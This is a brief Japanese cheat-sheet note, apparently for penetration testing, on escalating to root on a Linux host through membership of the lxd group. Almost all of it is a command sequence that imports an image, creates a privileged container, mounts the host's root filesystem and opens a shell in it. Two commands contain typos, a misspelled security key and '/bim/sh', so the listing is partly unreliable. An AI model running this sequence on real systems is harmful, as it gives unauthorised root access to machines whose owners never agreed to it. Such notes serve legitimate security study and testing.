# LXDとは
次世代のシステムコンテナおよび仮想マシンマネージャ。  
lxdグループに所属するユーザーのシェルを取得している場合、攻撃者はコンテナイメージをターゲットに送り込み、ターゲットシステムのroot権限を奪取する恐れがある。

## 手順
下記でコンテナイメージをダウンロードできる。
https://images.lxd.canonical.com/
```bash
# ターゲットでの操作
ls
lxd.tar.xz rootfs.squashfs
which lxc
/usr/bin/lxc
lxc image import lxd.tar.xz rootfs.squashfs --alias container
lxc image list 
lxc init container privesc -c serurity.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bim/sh
```
